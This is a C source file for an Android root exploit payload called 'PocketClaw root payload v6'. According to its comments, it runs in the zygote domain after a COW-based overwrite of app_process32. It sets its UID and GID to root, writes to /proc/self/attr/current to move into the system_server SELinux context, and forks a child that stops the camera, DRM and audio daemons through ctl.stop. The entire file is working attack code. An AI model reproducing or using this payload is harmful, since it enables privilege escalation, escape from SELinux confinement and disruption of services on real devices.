/*
 * PocketClaw root payload v6 — daemon stopper with fork isolation.
 *
 * Runs in zygote domain (when init restarts zygote with COW'd app_process32).
 * Forks a child to do the dangerous ctl.stop calls (may block).
 * Parent sleeps 30s to keep process alive for external restorer,
 * then exits so init restarts zygote with restored original binary.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/prctl.h>

extern int __system_property_set(const char *key, const char *value);

static int try_setcon(const char *ctx) {
    int fd = open("/proc/self/attr/current", O_WRONLY);
    if (fd < 0) return -1;
    int ret = write(fd, ctx, strlen(ctx));
    close(fd);
    return (ret > 0) ? 0 : -1;
}

int main(int argc, char *argv[]) {
    /* 1. Get root UID (works from zygote domain) */
    prctl(PR_SET_KEEPCAPS, 1, 0, 0, 0);
    setgid(0);
    setuid(0);

    /* 2. Transition to system_server for ctl.stop */
    try_setcon("u:r:system_server:s0");

    /* 3. Fork: child does ctl.stop (may block), parent stays alive */
    pid_t pid = fork();
    if (pid == 0) {
        /* Child: do the dangerous property_set calls */
        alarm(10);  /* safety: die after 10s if stuck */
        __system_property_set("ctl.stop", "qcamerasvr");
        __system_property_set("ctl.stop", "drm");
        __system_property_set("ctl.stop", "audiod");
        /* Skip ril-daemon — blocks + rild respawns anyway */
        _exit(0);
    }

    /* 4. Parent: sleep 30s for external restorer to COW back original,
     *    then exit so init restarts zygote with clean binary. */
    sleep(30);
    _exit(0);
    return 0;
}
